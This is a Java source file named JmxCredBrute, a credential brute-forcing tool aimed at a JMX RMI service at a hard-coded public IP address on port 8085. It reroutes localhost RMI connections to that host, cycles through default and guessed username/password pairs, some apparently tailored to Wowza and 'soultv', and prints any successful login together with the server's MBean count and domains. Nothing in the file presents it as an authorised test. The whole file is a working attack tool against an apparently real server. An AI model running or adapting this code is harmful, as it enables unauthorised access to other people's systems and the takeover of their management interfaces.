import javax.management.remote.*;
import javax.management.remote.rmi.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.*;
import java.net.*;
import java.util.*;
public class JmxCredBrute {
  static final String REAL="160.202.130.243";
  static class RSF extends RMISocketFactory {
    public Socket createSocket(String host,int port) throws IOException {
      if (host==null||host.equals("localhost")||host.equals("127.0.0.1")||host.equals("0.0.0.0")) host=REAL;
      Socket s=new Socket(); s.setSoTimeout(15000); s.connect(new InetSocketAddress(host,port),15000); return s;
    }
    public ServerSocket createServerSocket(int port) throws IOException { return new ServerSocket(port); }
  }
  public static void main(String[] a) throws Exception {
    RMISocketFactory.setSocketFactory(new RSF());
    java.rmi.registry.Registry reg=java.rmi.registry.LocateRegistry.getRegistry(REAL,8085);
    RMIServer stub=(RMIServer)reg.lookup("jmxrmi");
    String[][] creds={
      {"admin","admin"},{"admin","password"},{"admin","123456"},{"admin","admin123"},
      {"wowza","wowza"},{"wowza","admin"},{"wowza","password"},{"wowza","123456"},
      {"soultv","soultv"},{"soultv","admin"},{"soultv","123456"},{"soultv","password"},
      {"manager","manager"},{"user","user"},{"root","root"},{"test","test"},
      {"monitorRole","QED"},{"controlRole","R&D"},{"monitorRole","monitorrole"},
      {"admin","wowza"},{"admin","soultv"},{"admin","wza!2017"},{"admin","wowza123"},
      {"wowza","admin123"},{"readonly","readonly"},{"admin","1234"},{"admin","secret"}
    };
    for (String[] c:creds){
      Map<String,Object> env=new HashMap<>();
      env.put(JMXConnector.CREDENTIALS, c);
      try {
        JMXConnector conn=new RMIConnector(stub,env); conn.connect();
        javax.management.MBeanServerConnection m=conn.getMBeanServerConnection();
        System.out.println(">>> CRED HIT: "+c[0]+":"+c[1]+" | MBeans="+m.getMBeanCount()+" domains="+Arrays.toString(m.getDomains()));
        conn.close();
        return;
      } catch (SecurityException se) {
        System.out.println("  "+c[0]+":"+c[1]+" -> auth fail");
      } catch (Exception e) {
        System.out.println("  "+c[0]+":"+c[1]+" -> "+e.getClass().getSimpleName()+": "+e.getMessage());
      }
    }
    System.out.println("No JMX default cred hit (out of "+creds.length+").");
  }
}
